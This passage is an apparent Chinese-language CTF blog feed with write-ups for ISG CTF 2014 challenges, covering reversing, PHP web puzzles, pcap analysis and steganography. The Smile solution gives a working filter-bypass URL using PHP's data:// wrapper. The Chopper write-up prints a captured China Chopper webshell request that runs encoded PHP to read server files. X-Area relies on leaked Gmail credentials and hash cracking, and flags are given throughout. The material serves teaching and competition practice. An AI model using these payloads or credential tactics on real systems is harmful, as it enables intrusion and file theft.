    <content type="html"><![CDATA[<h1 id="Out-of-Space"><a href="#Out-of-Space" class="headerlink" title="Out of Space"></a>Out of Space</h1><p>这个程序不能直接运行，我队友试了，直接死机。看了看是用C#写的，直接用.NET Reflector反编译，源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">public static void Main()</div><div class="line">&#123;</div><div class="line">    Console.WriteLine(&quot;Generating data...&quot;);</div><div class="line">    StreamWriter writer = new StreamWriter(&quot;temp.txt&quot;);</div><div class="line">    ulong num = 1L;</div><div class="line">    do</div><div class="line">    &#123;</div><div class="line">        writer.Write(&quot;ISG&quot;);</div><div class="line">        num += (ulong) 1L;</div><div class="line">    &#125;</div><div class="line">    while (num &lt;= 0xfa00000000L);</div><div class="line">    writer.Close();</div><div class="line">    Console.WriteLine(&quot;Almost done...&quot;);</div><div class="line">    SHA1CryptoServiceProvider provider = new SHA1CryptoServiceProvider();</div><div class="line">    FileStream inputStream = new FileStream(&quot;temp.txt&quot;, FileMode.Open, FileAccess.Read);</div><div class="line">    byte[] buffer = provider.ComputeHash(inputStream);</div><div class="line">    inputStream.Close();</div><div class="line">    File.Delete(&quot;temp.txt&quot;);</div><div class="line">    Console.WriteLine(&quot;ISG&#123;&quot; + BitConverter.ToString(buffer).ToLower() + &quot;&#125;&quot;);</div><div class="line">    Console.ReadKey();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>代码功能，主要就是计算<code>0xfa00000000</code>个“ISG”的<code>SHA1</code>值，所以无需写入文件，直接在内存里计算，这里直接写个Python脚本跑一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">import hashlib</div><div class="line"></div><div class="line">part = &apos;ISG&apos; * 40</div><div class="line">sha1 = hashlib.sha1()</div><div class="line">i = 0</div><div class="line">while i &lt; 0xfa00000000:</div><div class="line">	sha1.update(part)</div><div class="line">	if i % 10000000000 == 0:</div><div class="line">		print str(i) + &apos;: &apos; + sha1.hexdigest()</div><div class="line">	i += 40</div><div class="line">print &apos;ISG&#123;&apos; + sha1.hexdigest() + &apos;&#125;&apos;</div></pre></td></tr></table></figure></p>
<p>当时失误，一次计算的数据量有点小，导致计算了将近6个小时，最后得到结果：<code>ISG{86386ac8da052d2dc694218affa57b920d02583b}</code><br>。直接提交，结果不对，我又去翻了翻SHA1的原理，发现这么计算没问题，后来让队友在C#下试了试，发现Bitonvert会在每个字节间加“-“，最后加上：<code>ISG{86-38-6a-c8-da-05-2d-2d-c6-94-21-8a-ff-a5-7b-92-0d-02-58-3b}</code>。</p>
<h1 id="X-Area"><a href="#X-Area" class="headerlink" title="X-Area"></a>X-Area</h1><p>首先，有登录框，一顿尝试未果，取消后给了个邮箱，一开始不知道有啥用，后来想到泄漏的500万Gmail帐号，在其中一搜，果真有，用搜到的密码登录，得到如下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">/*</div><div class="line">I found a piece of hash from an old basic auth file.</div><div class="line">0ops:$apr1$XZ6oHreE$rYRGk9cFLxm1hF4TAc0m50</div><div class="line">That may be helpful.</div><div class="line">It is said that in the password nums and Lowercase letter only.</div><div class="line">Good luck!</div><div class="line">*/</div><div class="line">$valid_passwords = array (&quot;hack.the.life@gmail.com&quot; =&gt; &quot;zasada&quot;);</div><div class="line">$valid_users = array_keys($valid_passwords);</div><div class="line"></div><div class="line">$user = @$_SERVER[&apos;PHP_AUTH_USER&apos;];</div><div class="line">$pass = @$_SERVER[&apos;PHP_AUTH_PW&apos;];</div><div class="line"></div><div class="line">$validated = (in_array($user, $valid_users)) &amp;&amp; ($pass == $valid_passwords[$user]);</div><div class="line"></div><div class="line">if (!$validated) &#123;</div><div class="line">  header(&apos;WWW-Authenticate: Basic realm=&quot;X-Area&quot;&apos;);</div><div class="line">  header(&apos;HTTP/1.0 401 Unauthorized&apos;);</div><div class="line">  die (&quot;I don&apos;t think you are &apos;hack.the.life@gmail.com&apos;. Get out!&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">eval(base64_decode(&apos;ZXJyb3JfcmVwb3J0aW5nKDApOwpzZXRfdGltZV9saW1pdCgwKTsKCmZ1bmN0aW9uIGRlY3J5cHQoJGVuY3J5cHRlZCwgJGtleSkKewoJJGtleT1tZDUoJGtleSk7CiAgICAkY2lwaGVydGV4dF9kZWMgPSBwYWNrKCJIKiIsJGVuY3J5cHRlZCk7CiAgICAkbW9kdWxlID0gbWNyeXB0X21vZHVsZV9vcGVuKE1DUllQVF9SSUpOREFFTF8xMjgsICcnLCBNQ1JZUFRfTU9ERV9DQkMsICcnKTsKICAgICRpdiA9IHN1YnN0cihtZDUoJGtleSksMCxtY3J5cHRfZW5jX2dldF9pdl9zaXplKCRtb2R1bGUpKTsKICAgIG1jcnlwdF9nZW5lcmljX2luaXQoJG1vZHVsZSwgJGtleSwgJGl2KTsKICAgICRkZWNyeXB0ZWQgPSBtZGVjcnlwdF9nZW5lcmljKCRtb2R1bGUsICRjaXBoZXJ0ZXh0X2RlYyk7CiAgICBtY3J5cHRfZ2VuZXJpY19kZWluaXQoJG1vZHVsZSk7CiAgICBtY3J5cHRfbW9kdWxlX2Nsb3NlKCRtb2R1bGUpOwogICAgcmV0dXJuIHJ0cmltKCRkZWNyeXB0ZWQsIlwwIik7Cn0KCmlmKEAkX1JFUVVFU1RbJ2tleSddKXsKCSRrZXk9JF9SRVFVRVNUWydrZXknXTsKCWVjaG8gZXZhbCh+J5qcl5Dfmomek9ebmpyNho+L193OyJ2bzZyanp2am8zKns7Pz5mZnJuZyp2bm8bPzpmems7OxsrHypzJncrLyc7Nm8bHz8vMy8jKns6ZxpqdnJvGxsvPx86ZnJ7NnczLx57JzsvMz8jLycrKyprInM2dyMjKzJnPzcadysedz87IxpydzZvOzsidnc/Kmc7My5zNm57NmcnPxp3OzMzMys7OmZzIyMidmZ3PxpzNnMycx8uczZqdxpmcms/Mzp3Gxs7LyczJxpucmc2emsfNy8nJx8mby5qezJmbzcbOycidyciczMzPzMqdncuezcjKmsaanJ3IzsaczMidyc+Zyp2azZnNzZzJxpyazcvGyciam5zOncrGyJ7NxsedmZnGz8qbmZqamsbInsyezciZnpnIxp3Myp7HzMrHx8jPz5mdz8/Kz8vOnJqans3HyJuamcvHnsiemZmdx8zOx52dm8bHmsadnZ2ezcbJm52Zm57Gm8/O3dPf25SahtbWxCcpOwp9ZWxzZXsKCWVjaG8gIkFjY2VzcyBERU5JRUQhIjsKfQ==&apos;));</div><div class="line">echo &apos;&lt;!-- &apos;;echo file_get_contents(__FILE__);?&gt;</div></pre></td></tr></table></figure></p>
<p>可以看到，注释中有个帐号：<code>0ops:$apr1$XZ6oHreE$rYRGk9cFLxm1hF4TAc0m50</code>，用<code>John the Ripper</code>解密得到密码：<code>5s41t</code>。还有一段base64编码的，解码得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">error_reporting(0);</div><div class="line">set_time_limit(0);</div><div class="line"></div><div class="line">function decrypt($encrypted, $key)</div><div class="line">&#123;</div><div class="line">    $key=md5($key);</div><div class="line">    $ciphertext_dec = pack(&quot;H*&quot;,$encrypted);</div><div class="line">    $module = mcrypt_module_open(MCRYPT_RIJNDAEL_128, &apos;&apos;, MCRYPT_MODE_CBC, &apos;&apos;);</div><div class="line">    $iv = substr(md5($key),0,mcrypt_enc_get_iv_size($module));</div><div class="line">    mcrypt_generic_init($module, $key, $iv);</div><div class="line">    $decrypted = mdecrypt_generic($module, $ciphertext_dec);</div><div class="line">    mcrypt_generic_deinit($module);</div><div class="line">    mcrypt_module_close($module);</div><div class="line">    return rtrim($decrypted,&quot;\0&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">if(@$_REQUEST[&apos;key&apos;])&#123;</div><div class="line">    $key=$_REQUEST[&apos;key&apos;];</div><div class="line">    echo eval(~&apos;ß××ÝÎÈÍÌÊÎÏÏÊÆÏÎÎÎÆÊÇÊÉÊËÉÎÍÆÇÏËÌËÈÊÎÆÆÆËÏÇÎÍÌËÇÉÎËÌÏÈËÉÊÊÊÈÍÈÈÊÌÏÍÆÊÇÏÎÈÆÍÎÎÈÏÊÎÌËÍÍÉÏÆÎÌÌÌÊÎÎÈÈÈÏÆÍÌÇËÍÆÏÌÎÆÆÎËÉÌÉÆÍÇÍËÉÉÇÉËÌÍÆÎÉÈÉÈÌÌÏÌÊËÍÈÊÆÈÎÆÌÈÉÏÊÍÍÍÉÆÍËÆÉÈÎÊÆÈÍÆÇÆÏÊÆÈÌÍÈÈÆÌÊÇÌÊÇÇÈÏÏÏÏÊÏËÎÍÇÈËÇÈÇÌÎÇÆÇÆÍÆÉÆÏÎÝÓßÛÖÖÄ&apos;);</div><div class="line">&#125;else&#123;</div><div class="line">    echo &quot;Access DENIED!&quot;;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>eval的参数是将一个字符串取反，直接取反得到结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">decrypt(&quot;17bd2ceabed35a100ffcdf5bdd901fae119585c6b54612d98043475a1f9ebcd994081fca2b348a61430746555e7c2b7753f029b58b0179cb2d117bb05f134c2da2f609b1333511fc777bfb09c2c3c84c2eb9fce031b99146369dcf2ae8246686d4ea3fd29167b67c33035bb4a275e9ecb719c37b60f5be2f22c69ce24967edc1b597a298bff905dfeee97a3a27faf79b35a83588700fb005041ceea287def48a7affb8318bbd98e9bbba296dbfda9d01&quot;, $key));</div></pre></td></tr></table></figure></p>
<p>把这段代码和decrypt函数放在一起，然后执行得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ob_start(); //the flag is ISG&#123;tHe_MaGic_pHP_S0UrCE_c0D3&#125; echo &quot; Just get the flag!!&quot;; $info = ob_get_contents(); ob_end_clean(); echo &quot;Hello Hackers!&quot;; return $info;</div></pre></td></tr></table></figure></p>
<p>得到flag：<code>ISG{tHe_MaGic_pHP_S0UrCE_c0D3}</code>。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Out-of-Space&quot;&gt;&lt;a href=&quot;#Out-of-Space&quot; class=&quot;headerlink&quot; title=&quot;Out of Space&quot;&gt;&lt;/a&gt;Out of Space&lt;/h1&gt;&lt;p&gt;这个程序不能直接运行，我队友试了，直接死机。看了看是用C#写
    
    </summary>
    
      <category term="CTF" scheme="http://blog.watch0ut.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://blog.watch0ut.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ISG CTF 2014 Write-up (Smile, Chopper, Cryptobaby, GIF)</title>
    <link href="http://blog.watch0ut.com/2014/09/29/ISG-CTF-2014-Write-up-Smile-Chopper-Cryptobaby-GIF/"/>
    <id>http://blog.watch0ut.com/2014/09/29/ISG-CTF-2014-Write-up-Smile-Chopper-Cryptobaby-GIF/</id>
    <published>2014-09-29T12:30:25.000Z</published>
    <updated>2015-11-19T13:21:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Smile"><a href="#Smile" class="headerlink" title="Smile"></a>Smile</h1><p>点击界面上的链接<code>http://202.120.7.104:8888/?view-source</code>即可看到界面源码，其中php部分如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">    if (isset($_GET[&apos;view-source&apos;])) &#123; </div><div class="line">        show_source(__FILE__); </div><div class="line">        exit(); </div><div class="line">    &#125; </div><div class="line"></div><div class="line">    include(&apos;flag.php&apos;); </div><div class="line"></div><div class="line">    $smile = 1;  </div><div class="line"></div><div class="line">    if (!isset ($_GET[&apos;^_^&apos;])) $smile = 0;  </div><div class="line">    if (ereg (&apos;\.&apos;, $_GET[&apos;^_^&apos;])) $smile = 0;  </div><div class="line">    if (ereg (&apos;%&apos;, $_GET[&apos;^_^&apos;])) $smile = 0;  </div><div class="line">    if (ereg (&apos;[0-9]&apos;, $_GET[&apos;^_^&apos;])) $smile = 0;  </div><div class="line">    if (ereg (&apos;http&apos;, $_GET[&apos;^_^&apos;]) ) $smile = 0;  </div><div class="line">    if (ereg (&apos;https&apos;, $_GET[&apos;^_^&apos;]) ) $smile = 0;  </div><div class="line">    if (ereg (&apos;ftp&apos;, $_GET[&apos;^_^&apos;])) $smile = 0;  </div><div class="line">    if (ereg (&apos;telnet&apos;, $_GET[&apos;^_^&apos;])) $smile = 0;  </div><div class="line">    if (ereg (&apos;_&apos;, $_SERVER[&apos;QUERY_STRING&apos;])) $smile = 0;  </div><div class="line">    if ($smile) &#123; </div><div class="line">        if (@file_exists ($_GET[&apos;^_^&apos;])) $smile = 0;  </div><div class="line">    &#125;  </div><div class="line">    if ($smile) &#123; </div><div class="line">        $smile = @file_get_contents ($_GET[&apos;^_^&apos;]);  </div><div class="line">        if ($smile === &quot;(●&apos;◡&apos;●)&quot;) die($flag);  </div><div class="line">    &#125;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
<p>服务器会包含一个flag.php文件，该文件直接访问无输出，但应该定义了<code>`$flag</code>变量。</p>
<p>为了最终`die($flag)``的顺利执行，需要绕过上面的各种验证，而逻辑本身有两处矛盾：</p>
<p><code>$_GET</code>数组本身提取自<code>QUERY_STRING</code>，<code>$_GET[&#39;^_^&#39;]</code>中<code>key</code>包含<code>_</code>符号，而<code>QUERY_STRING</code>却不允许。<br><code>file_exists</code>需要寻找的文件必须不存在，但<code>file_get_contents</code>却能读到文件内容。<br>当然除了逻辑还有上面那一堆限制，比如参数的<code>value</code>但不可包含. <code>% 0-9</code>数字 <code>http(s) ftp telnet</code>关键字，文件的内容为unicode的笑脸。<br>这里直接给出最终方案：</p>
<p>当<code>.</code>或<code>[]</code>之类的符号作为参数的<code>key</code>的时候，会被PHP改写为<code>_</code>，但由于<code>QUERY_STRING</code>为用户提交的内容，所以不修改。具体参见<a href="http://ca.php.net/variables.external。" target="_blank" rel="external">http://ca.php.net/variables.external。</a><br>file_get_contents可以获取远程数据，但常用网络协议已经被正则过滤，因此需要选取其他协议。查阅PHP支持的协议和包装，发现RFC 2397的data协议可用。巧合的是，file_exists对于data指向内容判断为不存在。<br>最终构造url为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://202.120.7.104:8888/?^.^=data://text/plain;charset=unicode,(●&apos;◡&apos;●)</div></pre></td></tr></table></figure></p>
<p>flag为<code>ISG{_1N2N3N4N5N6B7B8B9B10B_}</code>。</p>
<h1 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h1><p>pcap分析，重点看HTTP包。<br>Follow一系列HTTP包之后发现，用户在url请求中不断提交一些编码的内容，url解码后再base64解码，发现是php脚本。<br>这一系列动作大致为：获取主机类型，获取文件列表，并最终获取文件。</p>
<p>最后一个HTTP包拼接后为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">POST /isg.php HTTP/1.1</div><div class="line"></div><div class="line">Cache-Control: no-cache</div><div class="line"></div><div class="line">X-Forwarded-For: 10.197.194.76</div><div class="line"></div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line"></div><div class="line">Referer: http://192.168.1.10/</div><div class="line"></div><div class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)</div><div class="line"></div><div class="line">Host: 192.168.1.10</div><div class="line"></div><div class="line">Content-Length: 470</div><div class="line"></div><div class="line">Connection: Close</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">ISG2014=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1nZXRfbWFnaWNfcXVvdGVzX2dwYygpP3N0cmlwc2xhc2hlcygkX1BPU1RbInoxIl0pOiRfUE9TVFsiejEiXTskZnA9QGZvcGVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=%2Fvar%2Fwww%2Fhtml%2Fx.tar.gzHTTP/1.1 200 OK</div><div class="line"></div><div class="line">Date: Sun, 07 Sep 2014 16:34:23 GMT</div><div class="line"></div><div class="line">Server: Apache/2.2.15 (CentOS)</div><div class="line"></div><div class="line">X-Powered-By: PHP/5.3.3</div><div class="line"></div><div class="line">Vary: Accept-Encoding</div><div class="line"></div><div class="line">Content-Length: 180</div><div class="line"></div><div class="line">Connection: close</div><div class="line"></div><div class="line">Content-Type: text/html; charset=UTF-8</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">-&gt;|....2..T.....</div><div class="line">.0....^E..&amp;.s..Rp....D[,...</div><div class="line">..[...:...g9.w..].</div><div class="line">.....&gt;...y...4._9...I..0.a..E4.d...b.1c..i...m........X...:i...m.Uy......Q.+.j.6f..F....k..............o....=.(..|&lt;-</div></pre></td></tr></table></figure></p>
<p>request解码后就是文件获取的脚本，对于response内容直接把raw输出到文件，命名为request中发现的x.tar.gz，解压得到flag：<code>ISG{China_Ch0pper_Is_A_Slick_Little_Webshe11}</code>。</p>
<h1 id="Cryptobaby"><a href="#Cryptobaby" class="headerlink" title="Cryptobaby"></a>Cryptobaby</h1><p>密码题，需要先逆向。程序本身要求需要输入正确的序列号。</p>
<p>逆向不难，直接OD找字符串Wrong，之后转到代码，下断跟踪，发现正误判断处为一个内存数据和函数返回结果对比。</p>
<p>其中对比的内存数据如下（28个字节）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">012F3018  E5 AD 50 0D |89 27 30 0E |1F 6F D6 0E |FF 63 D4 0C  瀛P.?0o?c?</div><div class="line">012F3028  DD 94 0D 0E |1F 46 A4 0F |A2 1D D9 0C              輸.F???....</div></pre></td></tr></table></figure></p>
<p>而数据算法函数为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">.text:00401000</div><div class="line">.text:00401000 ; =============== S U B R O U T I N E =======================================</div><div class="line">.text:00401000</div><div class="line">.text:00401000 ; Attributes: bp-based frame</div><div class="line">.text:00401000</div><div class="line">.text:00401000 sub_401000      proc near               ; CODE XREF: sub_401050+28p</div><div class="line">.text:00401000</div><div class="line">.text:00401000 var_C           = dword ptr -0Ch</div><div class="line">.text:00401000 var_8           = dword ptr -8</div><div class="line">.text:00401000 var_4           = dword ptr -4</div><div class="line">.text:00401000 arg_0           = dword ptr  8</div><div class="line">.text:00401000 arg_4           = dword ptr  0Ch</div><div class="line">.text:00401000</div><div class="line">.text:00401000                 push    ebp</div><div class="line">.text:00401001                 mov     ebp, esp</div><div class="line">.text:00401003                 sub     esp, 0Ch</div><div class="line">.text:00401006                 mov     [ebp+var_8], 83h</div><div class="line">.text:0040100D                 mov     [ebp+var_4], 0</div><div class="line">.text:00401014                 mov     [ebp+var_C], 0</div><div class="line">.text:0040101B                 jmp     short loc_401026</div><div class="line">.text:0040101D ; ---------------------------------------------------------------------------</div><div class="line">.text:0040101D</div><div class="line">.text:0040101D loc_40101D:                             ; CODE XREF: sub_401000+43j</div><div class="line">.text:0040101D                 mov     eax, [ebp+var_C]</div><div class="line">.text:00401020                 add     eax, 1</div><div class="line">.text:00401023                 mov     [ebp+var_C], eax</div><div class="line">.text:00401026</div><div class="line">.text:00401026 loc_401026:                             ; CODE XREF: sub_401000+1Bj</div><div class="line">.text:00401026                 mov     ecx, [ebp+var_C]</div><div class="line">.text:00401029                 cmp     ecx, [ebp+arg_4]</div><div class="line">.text:0040102C                 jnb     short loc_401045</div><div class="line">.text:0040102E                 mov     edx, [ebp+var_4]</div><div class="line">.text:00401031                 imul    edx, [ebp+var_8]</div><div class="line">.text:00401035                 mov     eax, [ebp+arg_0]</div><div class="line">.text:00401038                 add     eax, [ebp+var_C]</div><div class="line">.text:0040103B                 movzx   ecx, byte ptr [eax]</div><div class="line">.text:0040103E                 add     edx, ecx</div><div class="line">.text:00401040                 mov     [ebp+var_4], edx</div><div class="line">.text:00401043                 jmp     short loc_40101D</div><div class="line">.text:00401045 ; ---------------------------------------------------------------------------</div><div class="line">.text:00401045</div><div class="line">.text:00401045 loc_401045:                             ; CODE XREF: sub_401000+2Cj</div><div class="line">.text:00401045                 mov     eax, [ebp+var_4]</div><div class="line">.text:00401048                 mov     esp, ebp</div><div class="line">.text:0040104A                 pop     ebp</div><div class="line">.text:0040104B                 retn</div><div class="line">.text:0040104B sub_401000      endp</div></pre></td></tr></table></figure></p>
<p>翻译成C语言为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">int algorithm(char* str, unsigned int len)</div><div class="line">&#123;</div><div class="line">    int i;</div><div class="line">    int r;</div><div class="line"></div><div class="line">    r = 0;</div><div class="line">    for(i = 0; i &lt; len; ++i)</div><div class="line">        r = str[i] + 131 * r;</div><div class="line"></div><div class="line">    return r;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>需要对输入的28个字节数据分别应用上面的算法，每4个字节为一组，一共调用7次。</p>
<p>由于本人太懒，算法反函数直接采用Python穷举ASCII可见字符（data为内存数据）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">symbol = range(0x20, 0x7a)</div><div class="line">data = [0x0d50ade5, 0x0e302789, 0x0ed66f1f, 0x0cd463ff, 0x0e0d94dd, 0x0fa4461f, 0x0cd91da2]</div><div class="line">str = &quot;&quot;</div><div class="line"></div><div class="line">for i in range(len(data)):</div><div class="line">    for a in symbol:</div><div class="line">        for b in symbol:</div><div class="line">            for c in symbol:</div><div class="line">                for d in symbol:</div><div class="line">                    r = 131**3*a + 131**2*b + 131*c + d</div><div class="line">                    if r == data[i]:</div><div class="line">                        str += chr(a) + chr(b) + chr(c) + chr(d)</div><div class="line">                        break</div><div class="line">                    </div><div class="line">print(&apos;result: &apos; + str)</div></pre></td></tr></table></figure></p>
<p>得到结果<code>c011isi0n_is_a_thre4t_t0_sec</code>。加上ISG{}即为flag。</p>
<p>不过这个算法并不好，后来大神@JackPan助攻，直接看出是进制算法（131进制），因此可以直接写出反函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">data = [0x0d50ade5, 0x0e302789, 0x0ed66f1f, 0x0cd463ff, 0x0e0d94dd, 0x0fa4461f, 0x0cd91da2]</div><div class="line">str = &quot;&quot;</div><div class="line"></div><div class="line">for i in range(len(data) - 1, -1, -1):</div><div class="line">        num = data[i]</div><div class="line">        while num &gt; 0:</div><div class="line">                r = num % 131</div><div class="line">                num = int(num / 131)</div><div class="line">                str = chr(r) + str</div><div class="line"></div><div class="line">print(&apos;result: &apos; + str)</div></pre></td></tr></table></figure></p>
<p>这样就能秒出结果。</p>
<h1 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h1><p>送分题。gif图为多帧，down下后直接拖到ps中，发现还有一个隐藏图层，打开后扫描图片上二维码即为flag：<code>ISG{Solv3d_iN_SEConds_WiTH_RiGHT_T00Ls}</code>。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Smile&quot;&gt;&lt;a href=&quot;#Smile&quot; class=&quot;headerlink&quot; title=&quot;Smile&quot;&gt;&lt;/a&gt;Smile&lt;/h1&gt;&lt;p&gt;点击界面上的链接&lt;code&gt;http://202.120.7.104:8888/?view-source&lt;/code
    
    </summary>
    
      <category term="CTF" scheme="http://blog.watch0ut.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://blog.watch0ut.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>HITCON CTF 2014 Tarmful Write-up</title>
    <link href="http://blog.watch0ut.com/2014/08/26/HITCON-CTF-2014-Tarmful-Write-up/"/>
    <id>http://blog.watch0ut.com/2014/08/26/HITCON-CTF-2014-Tarmful-Write-up/</id>
    <published>2014-08-26T14:10:53.000Z</published>
    <updated>2015-11-15T15:01:28.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tarmful"><a href="#Tarmful" class="headerlink" title="Tarmful"></a>Tarmful</h1><p>Description<br>Just decompress them all.<br><a href="https://raw.githubusercontent.com/hitcon2014ctf/ctf/master/tarmful-3f13b82f7794de783adfd6fa9928ad2c.zip" target="_blank" rel="external">https://raw.githubusercontent.com/hitcon2014ctf/ctf/master/tarmful-3f13b82f7794de783adfd6fa9928ad2c.zip</a><br><a href="https://dl.dropbox.com/s/oh8cb6i63x7zggh/tarmful-3f13b82f7794de783adfd6fa9928ad2c.zip" target="_blank" rel="external">https://dl.dropbox.com/s/oh8cb6i63x7zggh/tarmful-3f13b82f7794de783adfd6fa9928ad2c.zip</a></p>
<h2 id="写在前面的碎碎念"><a href="#写在前面的碎碎念" class="headerlink" title="写在前面的碎碎念"></a>写在前面的碎碎念</h2><p>此题技术含量较低，考的只是一些基本功，不过分值竟然不算最低…… 作为全程给两位大神打辅助的人来说，这种题大神是看不上的……</p>
